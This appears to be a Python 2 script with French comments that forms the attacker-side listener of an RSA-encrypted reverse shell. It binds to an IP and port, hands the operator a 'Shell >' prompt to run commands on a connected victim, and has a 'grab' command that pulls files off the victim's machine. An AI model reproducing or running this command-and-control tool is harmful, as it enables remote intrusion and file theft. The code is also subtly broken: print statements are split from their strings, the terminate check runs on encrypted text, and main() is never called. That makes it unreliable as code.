__author__ = "Dobidobe"
import socket
from Crypto.PublicKey import RSA

#Fonction de chiffrage 
def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
INDIQUER PUBLIC KEY
-----END PUBLIC KEY-----'''

    encryptor = RSA.importKey(publickey)
    encryptedData = encryptor.encrypt(message, 0)
    return encryptedData[0]

#Fonction cipher déchiffrage
def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
INDIQUER PRIVATE KEY 
-----END RSA PRIVATE KEY-----'''

    decryptor = RSA.importKey(privatekey)
    return decryptor.decrypt(cipher)

#Fonction de transfert 
def transfer(conn, command):
    conn.send(command)
    f = open('/root/', 'wb') #Indiquer le PATH du/des fichiers à récupérer
    while True:
        bits = conn.recv(1024)
        if 'File not found' in bits:
            print
            'File not found'
            break
        if bits.endswith('DONE'):
            print
            'File transfer complete'
            f.close()
            break
        f.write(bits)
    f.close()

#Fonction de connection aux ports Socket 
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('156.2.2.2', 8080))#bind le port à écouter
    s.listen(1)
    conn, addr = s.accept()
    print
    '[+] La connection vient de cette adresse IP :  ' + str(addr)

    while True:
        store = ''
        command = raw_input("Shell > ")
        command = encrypt(command)
        # Ferme la connection par commande
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break

        if 'grab' in command:
            transfer(conn, command)

        else:
            conn.send(command)
            result = conn.recv(1024)
            if len(decrypt(result)) == 512:
                store = store + decrypt(result)
                result = conn.recv(512)
                store = store + decrypt(result)

            else:
                print
                decrypt(result)


def main():
    connect()
